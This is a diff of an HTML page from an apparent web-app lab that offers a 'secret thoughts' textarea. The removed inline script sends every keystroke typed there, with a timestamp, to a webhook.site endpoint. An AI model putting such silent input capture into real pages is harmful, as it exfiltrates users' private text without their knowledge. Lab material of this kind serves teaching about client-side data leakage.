@@ -1,25 +1,8 @@
+<!DOCTYPE html>
 <html>
-  <head>
-    <title>Static Web App Lab 4</title>
-  </head>
   <body>
-    <div>
-      <h1>Static Web App Lab 4 - Write</h1>
-      <div>
-        <h2>Secret Thoughts</h2>
-        <textarea id="secretThoughts"></textarea>
-      </div>
-    </div>
-    <script>
-      const textarea = document.getElementById("secretThoughts")
-      textarea.addEventListener("input", function (e) {
-        const text = e.target.value
-        fetch(
-          `https://webhook.site/3fbf66c0-50b1-483a-b661-7d8283fd309f?text=${encodeURIComponent(
-            text
-          )}&timestamp=${encodeURIComponent(new Date().toISOString())}`
-        ).catch(console.error)
-      })
-    </script>
+    <h1>Paste your thoughts here</h1>
+    <textarea id="secretThoughts"></textarea>
+    <script src="script.js"></script>
   </body>
 </html>
